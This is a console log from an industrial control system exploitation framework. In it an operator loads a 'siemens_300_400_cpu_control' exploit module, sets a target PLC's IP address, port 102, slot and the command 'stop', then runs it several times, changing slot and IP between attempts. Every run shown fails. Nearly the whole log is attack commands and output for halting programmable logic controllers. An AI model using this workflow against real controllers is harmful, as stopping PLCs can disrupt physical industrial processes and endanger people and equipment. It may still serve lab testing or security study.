isf > autorun
[*] Autorun ON

Exploit Autorun List
====================

  0) apply
  1) touch all
  2) prompt confirm
  3) execute


Payload Autorun List
====================

  0) apply
  1) prompt confirm
  2) execute


isf > setg ISFStorage D:\isf\isf\storage
[+] Set ISFStorage =>. D:\isf\isf\storage
isf > show Exploit

Plugin Category: Exploit
========================

  Name                            Version
  ----                            -------
  Schneider_CPU_Command           1.1.0
  siemens_300_400_cpu_control     1.1.0

isf > use siemens_300_400_cpu_control

[!] Entering Plugin Context :: siemens_300_400_cpu_control
[*] Applying Global Variables

isf Exploit (siemens_300_400_cpu_control) > apply
[*] Applying Session Parameters
isf Exploit (siemens_300_400_cpu_control) > echo Running Exploit Touches
[*] Running Exploit Touches
isf Exploit (siemens_300_400_cpu_control) > touch all
isf Exploit (siemens_300_400_cpu_control) > enter Exploit

isf Exploit (siemens_300_400_cpu_control) > prompt confirm

[!] Enter Prompt Mode :: siemens_300_400_cpu_control

Module: siemens_300_400_cpu_control
===================================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp                                                              
  TargetPort      102                                                   
  Slot            3                                                     
  Command         stop                                                  

[!] plugin variables are valid

[*]  TargetIp :: Target IP Address

[+] Set TargetIp => 192.168.1.10

[*]  TargetPort :: Target Port

[+] Set TargetPort => 102

[*]  Slot :: The number of slot

[+] Set Slot => 3

[*]  Command :: The control command of cpu [stop/cold/hot]

[+] Set Command => stop

isf Exploit (siemens_300_400_cpu_control) > execute

[!] Preparing to Execute siemens_300_400_cpu_control

Module: siemens_300_400_cpu_control
===================================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        192.168.1.10                                          
  TargetPort      102                                                   
  Slot            3                                                     
  Command         stop                                                  

[*] Executing Plugin
[-] Timeout error
[-] Error running plugin: 
[-] Error: siemens_300_400_cpu_control Failed
isf Exploit (siemens_300_400_cpu_control) > execute

[!] Preparing to Execute siemens_300_400_cpu_control

Module: siemens_300_400_cpu_control
===================================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        192.168.1.10                                          
  TargetPort      102                                                   
  Slot            3                                                     
  Command         stop                                                  

[*] Executing Plugin
[!] Plugin failed
[-] Error: siemens_300_400_cpu_control Failed
isf Exploit (siemens_300_400_cpu_control) > !ping 192.168.1.11
isf Exploit (siemens_300_400_cpu_control) > info

Information
===========


    Name: siemens_300_400_cpu_control
 Version: 1.1.0
    Type: Exploit


Redirection
===========


  Local
  =====

   *Empty* 

  Remote
  ======

   *Empty* 


Parameters
==========


  Name            Value             Description                                           
  ----            -----             -----------                                           
  TargetIp        192.168.1.10      Target IP Address                                     
  TargetPort      102               Target Port                                           
  Slot            3                 The number of slot                                    
  Command         stop              The control command of cpu [stop/cold/hot]            

isf Exploit (siemens_300_400_cpu_control) > set Slot 2
[+] Set Slot => 2
isf Exploit (siemens_300_400_cpu_control) > info

Information
===========


    Name: siemens_300_400_cpu_control
 Version: 1.1.0
    Type: Exploit


Redirection
===========


  Local
  =====

   *Empty* 

  Remote
  ======

   *Empty* 


Parameters
==========


  Name            Value             Description                                           
  ----            -----             -----------                                           
  TargetIp        192.168.1.10      Target IP Address                                     
  TargetPort      102               Target Port                                           
  Slot            2                 The number of slot                                    
  Command         stop              The control command of cpu [stop/cold/hot]            

isf Exploit (siemens_300_400_cpu_control) > execute

[!] Preparing to Execute siemens_300_400_cpu_control

Module: siemens_300_400_cpu_control
===================================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        192.168.1.10                                          
  TargetPort      102                                                   
  Slot            2                                                     
  Command         stop                                                  

[*] Executing Plugin
[!] Plugin failed
[-] Error: siemens_300_400_cpu_control Failed
isf Exploit (siemens_300_400_cpu_control) > info

Information
===========


    Name: siemens_300_400_cpu_control
 Version: 1.1.0
    Type: Exploit


Redirection
===========


  Local
  =====

   *Empty* 

  Remote
  ======

   *Empty* 


Parameters
==========


  Name            Value             Description                                           
  ----            -----             -----------                                           
  TargetIp        192.168.1.10      Target IP Address                                     
  TargetPort      102               Target Port                                           
  Slot            2                 The number of slot                                    
  Command         stop              The control command of cpu [stop/cold/hot]            

isf Exploit (siemens_300_400_cpu_control) > set TargetIp 192.168.1.11
[+] Set TargetIp => 192.168.1.11
isf Exploit (siemens_300_400_cpu_control) > info

Information
===========


    Name: siemens_300_400_cpu_control
 Version: 1.1.0
    Type: Exploit


Redirection
===========


  Local
  =====

   *Empty* 

  Remote
  ======

   *Empty* 


Parameters
==========


  Name            Value             Description                                           
  ----            -----             -----------                                           
  TargetIp        192.168.1.11      Target IP Address                                     
  TargetPort      102               Target Port                                           
  Slot            2                 The number of slot                                    
  Command         stop              The control command of cpu [stop/cold/hot]            

isf Exploit (siemens_300_400_cpu_control) > execute

[!] Preparing to Execute siemens_300_400_cpu_control

Module: siemens_300_400_cpu_control
===================================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        192.168.1.11                                          
  TargetPort      102                                                   
  Slot            2                                                     
  Command         stop                                                  

[*] Executing Plugin
[!] Plugin failed
[-] Error: siemens_300_400_cpu_control Failed
isf Exploit (siemens_300_400_cpu_control) > EOF
